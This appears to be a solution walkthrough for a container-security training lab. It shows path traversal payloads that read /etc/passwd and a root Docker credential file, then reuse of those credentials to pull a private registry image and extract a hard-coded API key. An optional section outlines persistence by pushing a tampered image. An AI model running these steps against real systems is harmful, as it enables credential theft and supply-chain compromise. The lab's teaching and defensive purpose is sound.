# Exploiting Private Registry via Misconfiguration - Solution

* Navigate to the application `http://mailbox-service.planetkesten.com`

* Login to the application using `username: bob` and `password: bobmailbox`

![](images/app-login.png)

* We can see that `README.md` discloses information regarding the private registry

![](images/information-disclosure.png)


* It appears that the `page` parameter is vulnerable to an Insecure Direct Object Reference, potentially allowing us to read other files on the system.
  
* Let's try out a common payload and see if this IDOR is actually a path traversal vulnerability. We can gain read a local files using payload `qqqqq/../../etc/passwd`

![](images/path-traversal-exploitation.png)

* Similarly we can read other sensitive files in the system and find that the system contains `/root/.docker/config.json` with payload `qqqqq/../../root/.docker/config.json`

![](images/docker-config.png)

* We can use this docker configuration to pull docker images from private registry. Save the `config.json` file onto your system

* Run the following command to configure the docker private registry using configuration file.

```bash
docker login -u _json_key -p "$(cat config.json)" https://gcr.io
```

![](images/docker-registry-login.png)

* Now pull the private registry image to get the backend source code

```bash
docker pull gcr.io/training-automation-stuff/backend-source-code:latest
```

![](images/pull-private-image.png)

```bash
docker run --rm -it gcr.io/training-automation-stuff/backend-source-code:latest sh
ls -la
cat index.js
```

![](images/source-code-hardcoded-key.png)

* Now you can see that we have got the `NASA_DEMO_API_KEY` which is hard coded in the container image


## (Optional) Now lets gain persistence and spread through the company. 

The ability to push to arbitrary repositories
is a company ending event. It bypasses all the gating checks between environments and offers complete 
lateral movement. It offers the attacker the chance to hop from dev to production, or datacenter to cloud.

Let's rebuild the container. Inspecting the image using the `docker history` command
shows information about the layers much like `git history`. The dfimage container leverages
layer metadata to build a nice Dockerfile. If it fails, fall back to `docker history`.

```
alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"
dfimage -sV=1.36 kbroughton/k8s-workshop-mailbox-service
```

Any "COPY" or "ADD" commands will need to be recovered from directories in the container.
"ENV" and "LABEL" with spaces between items may need to be quoted. Expect other manual touch-ups.

Copy the output into a Dockerfile. We will modify it, tag it and push to the new container to the repo.
Any manifests which use the "latest" tag will easily pick this up. If not, but we know the existing tag,
then we can likely over-write the tag. Artifactory has a no-overwrite setting but it is disabled by default.

From within the container, the container code would need to be exfiltrated or modified insitue.
From the node, with the running container
```
docker cp $CONTAINER_ID:/path node_path
```

The best target for embedding malicious content would be 3rd party libraries with typo-squatted names
or portions of the container codebase which are complex or had undergone recent overhauls.

The major defenses are:

* Binary authorization / Notary Services so that only a few dedicated build machines can sign container manifests
and only signed containers can run on production nodes.
* Separate repos for development and production. Many devs can push to a wild-west container repo, but only strictly
gated service accounts can publish to production repositories.

The same impact and defenses apply to the ability to write to source repositories. The most difficult things to
secure are common utility repos which many teams may need to update.

* An alternative coming soon... kubectl debug

Released in kubectl v1.8 in beta, you can latch onto a running pod but with elevated tools and privileges
of a debug container speficied in the `--image` section in the command below.

```
kubectl alpha debug -it mailbox-service-74c9949944-rn5k4 --image alpine --target mailbox-service-74c9949944-rn5k4
```

## Instructor Notes

[Custom Kind with ephemeral containers](https://medium.com/01001101/ephemeral-containers-the-future-of-kubernetes-workload-debugging-c5b7ded3019f)

